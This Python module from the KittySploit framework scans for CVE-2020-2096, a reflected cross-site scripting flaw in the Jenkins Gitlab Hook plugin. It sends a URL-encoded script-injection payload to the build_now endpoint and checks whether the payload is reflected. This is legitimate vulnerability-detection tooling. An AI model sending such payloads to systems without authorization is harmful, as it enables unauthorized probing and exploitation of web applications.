#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Jenkins Gitlab Hook 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jenkins Gitlab Hook <=1.4.2 - Cross-Site Scripting Detection',
        'description': 'Jenkins Gitlab Hook 1.4.2 and earlier does not escape project names in the build_now endpoint, resulting in a reflected cross-site scripting vulnerability.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'jenkins', 'xss', 'gitlab', 'plugin', 'packetstorm', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://jenkins.io/security/advisory/2020-01-15/#SECURITY-1683',
            'http://www.openwall.com/lists/oss-security/2020/01/15/1',
            'http://packetstormsecurity.com/files/155967/Jenkins-Gitlab-Hook-1.4.2-Cross-Site-Scripting.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-2096',
            'https://github.com/Elsfa7-110/kenzer-templates',
        ],
        'cve': 'CVE-2020-2096',
    }

    def run(self):
        r = self.http_request(method="GET", path='/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('</script><script>alert(document.domain)</script>',)
        header_any = ('text/html',)
        if (any(m in body for m in body_any)) and (any(m in headers for m in header_any)):
            self.set_info(
                severity='medium',
                reason="Jenkins Gitlab Hook <=1.4.2 - Cross-Site Scripting detected",
                path='/gitlab/build_now%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E',
            )
            return True
        return False

